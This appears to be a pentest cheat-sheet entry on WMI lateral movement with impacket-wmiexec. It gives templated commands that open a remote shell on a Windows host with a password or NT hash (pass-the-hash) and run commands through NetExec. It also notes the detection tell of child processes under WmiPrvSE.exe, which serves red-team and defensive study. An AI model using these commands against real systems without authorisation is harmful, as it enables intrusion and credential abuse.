---
id: wmiexec-impacket
title: WMI remote exec (impacket-wmiexec, no service dropped)
section: Lateral movement & remote execution
phase: Execution
attack:
  tactic: TA0002
  techniques: [T1047]
platform: [windows, network]
source: hacktheplanet §"Lateral movement & remote execution"
pair: wmiexec-4688
---

WMI gives a semi-interactive shell over DCOM (135 → a high ephemeral port)
without dropping a service the way psexec does — quieter on `7045`, but every
command still runs as a child of `WmiPrvSE.exe`, which is the blue tell. Password
or hash both work.

```sh
impacket-wmiexec {{domain}}/{{user}}:{{password}}@{{rhost}}
impacket-wmiexec -hashes :{{nthash}} {{domain}}/{{user}}@{{rhost}}
nxc smb {{rhost}} -u {{user}} -H {{nthash}} --exec-method wmiexec -x 'whoami'
```
